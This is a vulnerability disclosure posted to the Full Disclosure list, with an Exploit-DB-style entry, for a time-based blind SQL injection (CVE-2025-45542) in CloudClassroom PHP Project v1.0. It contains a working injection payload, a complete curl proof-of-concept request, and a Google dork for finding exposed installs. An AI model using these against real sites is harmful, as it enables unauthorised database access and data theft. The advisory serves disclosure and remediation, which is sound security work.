Hello Full Disclosure list,
I am sharing details of a newly assigned CVE affecting an open-source
educational software project:
------------------------------------------------------------------------
CVE-2025-45542: Time-Based Blind SQL Injection in CloudClassroom PHP
Project v1.0
------------------------------------------------------------------------
Product: CloudClassroom PHP Project
Vendor: https://github.com/mathurvishal/CloudClassroom-PHP-Project
Affected Version: v1.0
Vulnerability Type: SQL Injection
Attack Type: Remote
CVE ID: CVE-2025-45542
Discoverer: Sanjay Singh
Vulnerability Details:
A time-based blind SQL injection vulnerability exists in the
`registrationform` endpoint of CloudClassroom-PHP-Project v1.0. The `pass`
parameter is not properly sanitized, allowing an unauthenticated remote
attacker to manipulate backend SQL logic and potentially extract sensitive
information.
Proof of Concept:
The vulnerability can be exploited using a POST request with a crafted
payload like:
`'XOR(if(now()=sysdate(),sleep(6),0))XOR'`
Impact:
Successful exploitation allows for:
- Arbitrary SQL execution
- Potential information disclosure
- Authentication bypass under certain conditions
Recommended Mitigations:
- Use prepared statements with parameterized queries
- Sanitize input with `mysqli\_real\_escape\_string()` or similar
- Implement a Web Application Firewall (WAF)
- Enforce least privilege on the applicationâ€™s DB user
References:
- GitHub: https://github.com/mathurvishal/CloudClassroom-PHP-Project
- Exploit-DB Submission (pending approval)
- GHDB Dork (submitted): `inurl:"CloudClassroom-PHP-Project-master"
intitle:"Cloud Classroom"`
I have also submitted this to Exploit-DB and the Google Hacking Database to
assist defenders and researchers.
Attached is a detailed advisory in plain text format.
Regards,
Sanjay Singh

# Exploit Title: CloudClassroom PHP Project v1.0 - Time-Based Blind SQL Injection (pass parameter)
# Google Dork: inurl:CloudClassroom-PHP-Project-master
# Date: 2025-05-30
# Exploit Author: Sanjay Singh
# Vendor Homepage: https://github.com/mathurvishal/CloudClassroom-PHP-Project
# Software Link: https://github.com/mathurvishal/CloudClassroom-PHP-Project/archive/refs/heads/master.zip
# Version: 1.0
# Tested on: XAMPP on Windows 10 / Ubuntu 22.04
# CVE : CVE-2025-45542
# Description:
# A time-based blind SQL injection vulnerability exists in the pass parameter
# of the registrationform endpoint. An attacker can exploit this issue by sending
# a malicious POST request to delay server response and infer data.
# PoC Request (simulated using curl):
curl -X POST http://localhost/CloudClassroom-PHP-Project-master/registrationform \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "addrs=3137%20Laguna%20Street&course=1&dob=1967/1/1&email=testing@example.com&faname=test&fname=test&gender=Female&lname=test&pass=u]H[ww6KrA9F.x-F0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z&phno=94102&sub="
# The server response will be delayed if the SQL condition is true, confirming the injection point.
